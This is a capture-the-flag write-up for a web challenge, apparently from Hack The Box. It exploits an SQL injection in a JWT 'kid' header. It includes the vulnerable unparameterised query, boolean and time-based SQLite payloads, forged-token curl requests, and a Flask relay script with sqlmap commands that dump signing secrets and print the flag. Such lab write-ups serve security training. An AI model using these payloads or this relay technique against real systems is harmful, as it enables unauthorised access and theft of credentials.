# Challenge Name: Majestic Sales

![Date](https://img.shields.io/badge/Date-31.08.2026-brightgreen.svg)  
![Category](https://img.shields.io/badge/Category-WEB-blueviolet.svg)  
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-blue.svg)  
![Value](https://img.shields.io/badge/Value-X-blue.svg)  

## Description

You've been tasked with a pentesting engagement on a sales management platform, they've provided you with a mockup build of the website and they've asked you to find a way to login as "admin".

Files:

[web_majestic_sales.zip](web_majestic_sales.zip)

## Detailed solution

Start by checking the app's home page 

<img width="780" height="611" alt="image" src="https://github.com/user-attachments/assets/6d8f22f0-5109-448d-b844-3d90f571c457" /> 
 
We have a login page and also a register page at `/register`
 
<img width="591" height="448" alt="image" src="https://github.com/user-attachments/assets/2679f6cd-0ac3-496a-87df-d8f57704e1c3" /> 
 
Now, after creating an account, we can use it to log in. We got a redirection to `/dashboard`, which sets a JWT session cookie
 
<img width="1269" height="699" alt="image" src="https://github.com/user-attachments/assets/7d2a7ed6-17ee-4b40-afa3-76e99fac3e79" /> 
 
We can use jwt.io to check our JWT Cookie
 
<img width="503" height="368" alt="image" src="https://github.com/user-attachments/assets/3914c49a-bb19-4522-99ca-1471b5fce0d7" /> 

We have multiple values, like kid, username, and tenant/office.

Looking at the dashboard we can see a message 🚨 Login as "admin" to view the flag here 🚨

<img width="431" height="115" alt="image" src="https://github.com/user-attachments/assets/63682364-97f3-4c5a-b476-e11c9d8f5d9d" />

So our goal is to log in as `admin` to get the flag.

Let's check the source code. We can find the main JWT verification at `challenge\middleware\AuthMiddleware.js`

```js
const JWTHelper = require('../helpers/JWTHelper');

const response = data => ({ message: data });

module.exports = async (req, res, next) => {
	let db = req.db;
	try {
		if (req.cookies.session === undefined) {
			if (!req.is('application/json')) return res.redirect('/');
			return res.status(401).send(response('Authentication required!'));
		}
		return JWTHelper.getKid(req.cookies.session)
			.then(kid => {
				if (kid === undefined) return res.status(500).send(response('kid is missing or doesn\'t exist!'));
				db.getAppKey(kid)
					.then(appKey => {
						if (appKey === undefined) return res.status(500).send(response('No such kid!'));
						JWTHelper.verify(req.cookies.session, appKey.secret)
							.then(data => {
								req.data = {
									username: data.username,
									tenant: data.tenant
								}
								next();
							})
							.catch(err => res.status(500).send(response(err.toString())));
					})
					.catch(err => res.status(500).send(err));
			})
			.catch(err => res.status(500).send(response("Something went wrong!")));
	} catch (e) {
		return res.status(500).send(response(e.toString()));
	}
}

```

We can see that the `kid` is pulled from the database `db.getAppKey(kid)` before verifying the JWT. The database query is located at `challenge\database.js`

```js
	async getAppKey(kid) {
		// TODO: add parametrization
		return new Promise(async (resolve, reject) => {
			try {
				let query = `SELECT * FROM app_config WHERE kid = '${kid}';`;
				resolve(await this.db.get(query));
			} catch(e) {
				reject(e);
			}
		});
	}
```

This is the only query without parametrization (db.prepare + stmt) which is a solution that helps against SQL injection attacks.

For reference, we have two `kid` values 1 and 2, for each office, in `challenge\database.js` / migrate

```
            INSERT INTO app_config (kid,tenant,secret) VALUES ('1','gr_office','REDACTED_SECRET_1');
            INSERT INTO app_config (kid,tenant,secret) VALUES ('2','uk_office','REDACTED_SECRET_2');
```

Our `kid` value is extracted from the JWT token and used directly inside the query. This leads to SQL injection as we control that value. We can escape the `'` and inject SQL statements.

Now let's use the `/dashboard` page for injection. We can use https://www.jwt.io/ editor to modify the kid value and interact with the page.

Remember the query `SELECT * FROM app_config WHERE kid = '${kid}'`. We can inject after a valid `kid` value of 2 (uk_office) and escape using ' to add additional SQL statements to confirm the injection.

We can start with `` ' AND 1=1--`` which is valid (True) and will not affect the kid value `SELECT * FROM app_config WHERE kid = '2' AND 1=1--'`

Use the JWT editor and change `kid` to `2' AND 1=1--`

```
curl http://HOST/dashboard -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjInIEFORCAxPTEtLSJ9.eyJ1c2VybmFtZSI6ImJhYWRtYXJvIiwidGVuYW50IjoidWtfb2ZmaWNlIiwiaWF0IjoxNzg4MzgyNjYyfQ.xNxIx8qGyyqKnvqPwxdiNIeS6nOyEJyXm5Zx-AHb_nw"

{"message":"JsonWebTokenError: invalid signature"}
```

As we can see, we got only the invalid signature message, which is normal since we changed values in the JWT without the secret, and the `kid` query got value 2 without error.

Now let's use `2' AND 1=2--`, which will fail because 1=2 is False

```
curl http://HOST/dashboard -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjInIEFORCAxPTItLSJ9.eyJ1c2VybmFtZSI6ImJhYWRtYXJvIiwidGVuYW50IjoidWtfb2ZmaWNlIiwiaWF0IjoxNzg4MzgyNjYyfQ.a95f4Jm2Ir0iA7mnIMJx6FBWHmfKa0KxGAwve6U2YVI"

{"message":"No such kid!"}
```

Now we got an error with `No such kid`, which confirms that we affected the query with the false condition 1=2.

In our case we have a blind output, so we need boolean/time/error-based attacks for the SQL injection.

From the source code, we already know that the database is SQLite. We can also confirm this using a time-based payload `2' AND 123=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(1000000000/2))))--` https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-time-based

```
http://HOST/dashboard -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjInIEFORCAxMjM9TElLRSgnQUJDREVGRycsIFVQUEVSKEhFWChSQU5ET01CTE9CKDEwMDAwMDAwMDAvMikpKSktLSJ9.eyJ1c2VybmFtZSI6ImJhYWRtYXJvIiwidGVuYW50IjoidWtfb2ZmaWNlIiwiaWF0IjoxNzg4MzgyNjYyfQ.h1Da04qFjeMCT8iarwgY-C_wqktweoR_C8cQ_hHnsMQ"

{"errno":18,"code":"SQLITE_TOOBIG"}
```

For extracting data blindly, we can use statements like SELECT/SUBSTRING to extract information, for example table length or the Xth character of a table/column..

For example, we know from the source code (Dockerfile) that the length of the secret used in the JWT is 15 so `"kid": "2' AND (SELECT LENGTH(secret) FROM app_config LIMIT 1 OFFSET 0) = 15 --"` will be valid and return only the signature error.

If you are a beginner with SQL injection, I suggest that you practice more with manual queries to extract information https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#sqlite-blind

Now let's switch to a better solution. I'll expose our entry point (kid value inside JWT) via a local web server, so SQLmap can inject directly through a simple controlled parameter. This kid value will be used to generate a new JWT for `/dashboard` interaction (error messages like we tested before) 

```py
from flask import Flask, request, jsonify
import requests
import jwt 
import datetime

app = Flask(__name__)

TARGET_HOST = "http://HOST/dashboard"  
TEST_SECRET = "test1111111111111111111111111111111111"

@app.route("/", methods=["GET"])
def relay():
    value = request.args.get("kid")
    if value is None:
        return jsonify({"error": "missing 'value' query parameter"}), 400

    payload = {
        "iat": "1819740356",
        "username": "baadmaro",
		"tenant": "uk_office"
    }

    custom_headers = {"kid": value}

    token = jwt.encode(
        payload,
        TEST_SECRET,
        algorithm="HS256",
        headers=custom_headers
    )

    resp = requests.get(
        TARGET_HOST,
        cookies={"session": token}
    )

    return resp.text

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=True)
```

Start the python app and use SQLmap to simplify the extraction

```sqlmap -u "http://127.0.0.1:5000/?kid=2*" --dbms sqlite```

<img width="523" height="152" alt="image" src="https://github.com/user-attachments/assets/a727ff7e-2dfb-4fb4-b89d-4dfd7b086051" />

We have two solutions to solve the challenge: 

- Get the secret used to sign the JWT and forge a new JWT with username admin `sqlmap -T app_config -C secret`. After extracting the secret, use a JWT editor to generate the new JWT to check `/dashboard`
- Extract the password of the admin user `sqlmap -T users`. Once you have extracted the admin password, log in using admin credentials and check `/dashboard`

```sqlmap -u "http://127.0.0.1:5000/?kid=2*" --dbms sqlite -T app_config -C secret --dump```

```
Table: app_config
[2 entries]
+-----------------+
| secret          |
+-----------------+
| qJ5RmZjfS9z1wia |
| k1EtYK1F5Cb77kw |
+-----------------+
```

<img width="2101" height="1069" alt="image" src="https://github.com/user-attachments/assets/05c340fc-d293-4419-b26b-142cee66c77e" />

Change the session cookie to this new one via DevTools, or use curl

<img width="2556" height="1525" alt="image" src="https://github.com/user-attachments/assets/592e85a9-ba54-4256-bd91-0db18214b08d" />


## Flag

```
HTB{0rd3r_of_th3_un10n_1nj3c70r5}
```
